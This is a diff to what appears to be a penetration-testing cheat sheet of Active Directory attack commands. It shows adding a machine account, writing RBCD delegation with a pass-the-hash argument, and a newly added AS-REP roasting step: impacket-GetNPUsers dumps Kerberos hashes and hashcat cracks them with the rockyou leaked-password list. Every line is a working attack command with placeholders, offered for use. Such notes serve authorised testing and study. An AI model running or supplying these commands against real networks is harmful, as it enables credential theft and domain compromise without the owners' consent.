@@ -58,3 +58,7 @@ impacket-addcomputer -computer-name 'myComputer$' -computer-pass 'h4x' -dc-ip <D
 
 # rbcd
 impacket-rbcd -action write -delegate-to "<TARGET_COMPUTER_ACC>$" -delegate-from "myComputer$" <DOMAIN>/<ACC_WITH_GENERIC_WRITE> -hashes :<NTHASH>
+
+# GetNPUsers check for DONT_REQ_PREAUTH (see kerbrute)
+impacket-GetNPUsers -dc-ip <DC_IP> <DOMAIN>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
+hashcat -m 18200 --force -a 0 hashes.asreproast /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
